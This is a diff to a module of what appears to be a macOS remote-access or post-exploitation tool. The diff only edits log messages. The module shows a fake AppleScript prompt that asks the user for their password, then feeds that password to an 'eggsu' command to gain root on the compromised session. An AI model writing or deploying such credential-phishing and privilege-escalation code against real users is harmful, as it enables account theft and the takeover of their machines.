@@ -5,7 +5,7 @@ import modules.helper as h
 class command:
     def __init__(self):
         self.name = "prompt"
-        self.description = "prompt user to type password"
+        self.description = "Prompt user to type password."
         self.type = "applescript"
 
     def run(self,session,cmd_data):
@@ -45,14 +45,14 @@ class command:
         cmd_data.update({"cmd":"eggsu","args":password})
         result = session.send_command(cmd_data)
         if "root" in result:
-            h.info_general("Root Granted")
+            h.info_general("Root Granted!")
             time.sleep(0.2)
-            h.info_general("Escalating Privileges")
+            h.info_general("Escalating Privileges...")
             if session.server.is_multi == False:
                 session.server.update_session(session)
             else:
                 session.needs_refresh = True
         else:
-            print "failed getting root"
+            h.info_error("Failed getting root!")
         return ""
 
